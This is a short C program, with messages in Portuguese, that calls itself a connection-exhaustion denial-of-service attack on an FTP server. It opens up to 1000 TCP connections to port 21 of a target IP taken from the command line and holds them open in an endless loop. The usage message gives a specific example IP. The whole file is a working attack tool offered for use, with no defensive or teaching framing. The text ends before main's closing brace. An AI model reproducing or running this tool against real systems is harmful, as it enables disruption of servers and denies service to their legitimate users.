#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <errno.h>

#define TARGET_PORT 21
#define MAX_CONNECTIONS 1000

void create_connection(int *socket_fd, struct sockaddr_in *server_addr) {
    
    *socket_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (*socket_fd < 0) {
        
        fprintf(stderr, "Erro ao criar socket: %s\n", strerror(errno));
        return;
    }

    
    if (connect(*socket_fd, (struct sockaddr *)server_addr, sizeof(*server_addr)) < 0) {
        
        close(*socket_fd);
        *socket_fd = -1; 
        return;
    }

    
    printf("Conexão estabelecida com sucesso (Socket FD: %d)\n", *socket_fd);
}

int main(int argc, char *argv[]) {
    struct sockaddr_in server_addr;
    int sockets[MAX_CONNECTIONS];
    int successful_connections = 0;
    int i;
    char *target_ip;

    
    if (argc != 2) {
        fprintf(stderr, "Uso: %s <IP_DO_ALVO>\n", argv[0]);
        fprintf(stderr, "Exemplo: %s 37.59.174.225\n", argv[0]);
        return 1;
    }

    target_ip = argv[1];

    printf("Iniciando ataque DoS de esgotamento de conexões no FTP %s:%d\n", target_ip, TARGET_PORT);

    
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(TARGET_PORT);

    
    if (inet_pton(AF_INET, target_ip, &server_addr.sin_addr) <= 0) {
        fprintf(stderr, "Erro: Endereço IP inválido ou não suportado\n");
        return 1;
    }

    
    for (i = 0; i < MAX_CONNECTIONS; i++) {
        int current_socket_fd;
        create_connection(&current_socket_fd, &server_addr);

        if (current_socket_fd != -1) {
            sockets[successful_connections++] = current_socket_fd;
        }
    }

    printf("\n--- Relatório ---\n");
    printf("Tentativas de conexão: %d\n", MAX_CONNECTIONS);
    printf("Conexões estabelecidas e mantidas abertas: %d\n", successful_connections);

    if (successful_connections > 0) {
        printf("O programa agora entrará em um loop infinito para manter as conexões abertas.\n");
        printf("Pressione CTRL+C para encerrar o programa e fechar as conexões.\n");
        
        while (1) {
            sleep(1); 
        }
    } else {
        printf("Nenhuma conexão foi estabelecida. Verifique o IP e a porta.\n");
    }

    for (i = 0; i < successful_connections; i++) {
        close(sockets[i]);
    }

    return 0;